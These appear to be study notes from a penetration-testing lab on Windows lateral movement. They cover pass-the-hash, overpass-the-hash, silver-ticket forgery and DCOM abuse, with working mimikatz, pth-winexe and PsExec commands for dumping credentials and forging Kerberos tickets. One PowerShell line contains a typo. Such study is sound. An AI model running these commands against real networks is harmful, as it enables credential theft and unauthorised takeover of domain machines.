there is not much cases that using cleartext based password hash

=============
pass the hash
=============
authenticate using NTLM hash
it grants us local administrative privilege
target : server or service that using NTLM hash, not kerberos

pth-winexe -U <NTLM hash> //<target ip> <shell>
ex. pth-winexe -U offsec%fjdioasfjdioas~~ //10.11.0.22 cmd

=================
overpass the hash
=================
abuse a NTLM user hash to gain a full kerberos TGT or service ticket
it grants us access to another machine or service as that user

1. save administrative user's credential into the cache : run a process with admin user
	open a notepad.exe
	right click the notepad icon on the taskbar
	shift+right click the notepad icon inside of the popup
	click 'run as different user'

2. dump the cached credential
	mimikatz.exe
		# sekurlsa::logonpasswords
3. turn the NTLM hash into a kerberos ticket
	it avoid the use of NTLM authentication
	mimikatz.exe
		# sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM hash> /run:<shell>
		ex. # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:f2f908d2~~~ /run:PowerShell.exe
	check the ticket
		PS> klist
		there is no cached tickets yet
4. authenticate to a network share on the DC
	it generate TGT
		PS> net use \\<DC>
	check the ticket
		PS> klist

5. reuse TGT to launch a command shell on the DC
	PsExec.exe
		runs a command remotely but doesn't accept password hashes
		.\PsExec.exe \\<machine> <shell>
		ex. .\PsExec.exe \\dc01 cmd.exe
	

===============
pass the ticket
===============
it's not required to get administrative privileges
it don't provide us with any additional access, we can choose which machine to use the ticket from
application server doesn't know the password hash. so blindly trust the integrity of the service ticket

conditions
	the service ticket belong to the current user
	the service is registered with a SPN

custom-created ticket(silver ticket)
	forge our own service ticket to application server
		using service account password or it's associated NTLM hash
	can use this against all has same SPN

1. obtain the security identifier(SID)
	> whoami /user
	SID : except of the last 4-digit part(that is RID)
	
2. create silver ticket
	mimikatz.exe
	flush any existing kerberos tickets
		# kerberos::purge
	verify the purge
		# kerberos::list
	create silver ticket
		# kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /target:<hostname> /service:<service type> /rc4:<password hash> /ptt
		/ptt : inject silver ticket directly into the memory
		ex. kerberos::golden /user:offsec /domain:corp.com /sid:S-1-~~~ /target:CorpWebServer.corp.com /service:HTTP /rc4:E24fds9f2~~~ /ptt

3. use the silver ticket
	can interact with the service and access any information based on the group memberships on silver ticket

==================================
distributed component object model
==================================
component object model(COM)
	a system for creating software components that interact with each other
	
leverage the DCOM object
	ex. excel
	PS> $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application". "<target ip>"))
	PS> $com | Get-Member
	make macro excel file and send to the victim
		exceldcom.ps1
